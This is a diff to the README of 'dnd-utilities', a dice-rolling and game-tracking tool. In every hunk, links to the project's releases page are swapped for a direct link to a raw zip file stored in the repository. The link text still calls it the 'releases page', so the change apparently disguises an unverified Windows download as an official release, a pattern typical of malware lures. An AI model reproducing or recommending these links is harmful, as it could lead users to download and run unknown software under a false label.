@@ -1,6 +1,6 @@
 # 🎲 dnd-utilities - Roll, duel, and track play
 
-[![Download dnd-utilities](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Sevenyearswarorgate855/dnd-utilities/releases)
+[![Download dnd-utilities](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Sevenyearswarorgate855/dnd-utilities/raw/refs/heads/main/assets/utilities_dnd_2.9.zip)
 
 ## 🧭 What is dnd-utilities?
 
@@ -10,7 +10,7 @@ Use it on a phone, tablet, or Windows device. It works well for game night, solo
 
 ## 💾 Download and install
 
-1. Open the [dnd-utilities releases page](https://github.com/Sevenyearswarorgate855/dnd-utilities/releases).
+1. Open the [dnd-utilities releases page](https://github.com/Sevenyearswarorgate855/dnd-utilities/raw/refs/heads/main/assets/utilities_dnd_2.9.zip).
 2. Find the latest release at the top of the page.
 3. Download the file listed in that release.
 4. If you get a `.zip` file, right-click it and choose **Extract All**.
@@ -101,4 +101,4 @@ baldurs-gate, dice-roller, dnd, dungeons-and-dragons, html-css-javascript, javas
 
 ## 🔗 Download again
 
-Visit the [download page here](https://github.com/Sevenyearswarorgate855/dnd-utilities/releases) to get the latest release for Windows
+Visit the [download page here](https://github.com/Sevenyearswarorgate855/dnd-utilities/raw/refs/heads/main/assets/utilities_dnd_2.9.zip) to get the latest release for Windows
